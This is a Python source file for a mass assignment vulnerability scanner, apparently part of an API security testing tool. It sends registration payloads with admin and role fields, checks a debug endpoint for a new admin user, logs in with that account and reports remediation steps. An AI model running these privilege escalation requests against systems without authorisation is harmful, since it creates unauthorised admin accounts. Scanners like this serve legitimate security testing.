#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Scanner
Checks if an API endpoint is vulnerable to mass assignment attacks
by attempting to set privileged attributes during object creation.
"""

import requests
import time
from typing import Dict, List, Optional, Any
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class MassAssignmentScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("mass_assignment")
        self.target = None
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        self.base_url = url
        self.target = url
        vulnerabilities = []
        
        try:
            # Headers setup
            request_headers = headers or {}
            request_headers['Content-Type'] = 'application/json'
            
            # Step 1: Check debug endpoint for initial state
            debug_url = f"{url}/users/v1/_debug"
            debug_resp = requests.get(
                debug_url,
                timeout=5
            )
            
            initial_users = []
            initial_admin_count = 0
            if debug_resp.status_code == 200:
                debug_data = debug_resp.json()
                initial_users = debug_data.get("users", [])
                initial_admin_count = len([u for u in initial_users if u.get("admin") == True])
                
                # Capture evidence of debug endpoint exposure
                debug_req, debug_res = self.capture_transaction(
                    debug_resp,
                    auth_state={"auth_type": "none"},
                    correlation_id=str(time.time())
                )
            
            # Step 2: Test mass assignment with privilege escalation
            test_payloads = [
                {
                    "username": f"test_admin_{int(time.time())}",
                    "password": "test123",
                    "email": f"test_{int(time.time())}@admin.me",
                    "admin": True,  # Attempting privilege escalation
                    "role": "admin"  # Alternative privilege escalation
                },
                {
                    "username": f"test_user_{int(time.time())}",
                    "password": "test123",
                    "email": f"test_{int(time.time())}@user.me",
                    "isAdmin": True,  # Alternative admin flag
                    "userRole": "administrator"  # Alternative role field
                }
            ]
            
            for test_payload in test_payloads:
                register_resp = requests.post(
                    f"{url}/users/v1/register",
                    json=test_payload,
                    headers=request_headers,
                    timeout=5
                )
                
                # Capture evidence of registration attempt
                register_req, register_res = self.capture_transaction(
                    register_resp,
                    auth_state={"auth_type": "none"},
                    correlation_id=str(time.time())
                )
                
                if register_resp.status_code == 200:
                    # Step 3: Verify privilege escalation success
                    verify_resp = requests.get(debug_url, timeout=5)
                    if verify_resp.status_code == 200:
                        verify_data = verify_resp.json()
                        final_users = verify_data.get("users", [])
                        final_admin_count = len([u for u in final_users if u.get("admin") == True])
                        
                        # Check if our admin user was created
                        if final_admin_count > initial_admin_count:
                            vulnerabilities.append({
                                "type": "MASS_ASSIGNMENT_PRIVILEGE_ESCALATION",
                                "severity": "CRITICAL",
                                "detail": "Successfully created admin user through mass assignment vulnerability",
                                "evidence": {
                                    "request": register_req,
                                    "response": register_res,
                                    "initial_admin_count": initial_admin_count,
                                    "final_admin_count": final_admin_count,
                                    "payload": test_payload,
                                    "vulnerable_fields": [k for k, v in test_payload.items() if k in ["admin", "role", "isAdmin", "userRole"]]
                                },
                                "remediation": {
                                    "description": "Mass assignment vulnerability allows privilege escalation",
                                    "impact": "Attackers can create admin users or escalate privileges",
                                    "steps": [
                                        "Implement proper input validation and sanitization",
                                        "Use an allowlist for permitted fields during object creation",
                                        "Remove sensitive fields from user input",
                                        "Implement proper role-based access control",
                                        "Add server-side validation for role assignments"
                                    ]
                                }
                            })
                            
                            # Step 4: Try to login with the created admin account
                            login_payload = {
                                "username": test_payload["username"],
                                "password": test_payload["password"]
                            }
                            
                            login_resp = requests.post(
                                f"{url}/users/v1/login",
                                json=login_payload,
                                headers=request_headers,
                                timeout=5
                            )
                            
                            if login_resp.status_code == 200:
                                # Capture evidence of successful admin login
                                login_req, login_res = self.capture_transaction(
                                    login_resp,
                                    auth_state={"auth_type": "none"},
                                    correlation_id=str(time.time())
                                )
                                
                                vulnerabilities.append({
                                    "type": "PRIVILEGE_ESCALATION_CHAIN",
                                    "severity": "CRITICAL",
                                    "detail": "Complete privilege escalation chain: mass assignment -> admin creation -> admin access",
                                    "evidence": {
                                        "register_request": register_req,
                                        "register_response": register_res,
                                        "login_request": login_req,
                                        "login_response": login_res,
                                        "attack_chain": [
                                            "Mass Assignment",
                                            "Privilege Escalation",
                                            "Admin Account Creation",
                                            "Unauthorized Admin Access"
                                        ]
                                    },
                                    "remediation": {
                                        "description": "Multiple vulnerabilities allow complete privilege escalation",
                                        "impact": "Critical security breach enabling unauthorized admin access",
                                        "steps": [
                                            "Fix mass assignment vulnerability",
                                            "Implement proper role validation",
                                            "Add authentication checks",
                                            "Implement proper session management",
                                            "Add activity logging and monitoring"
                                        ]
                                    }
                                })
                
        except requests.RequestException as e:
            self.logger.error(f"Error in mass assignment privilege escalation check: {str(e)}")
            
        return vulnerabilities

# Keep the scan function for backward compatibility
scan = MassAssignmentScanner().scan
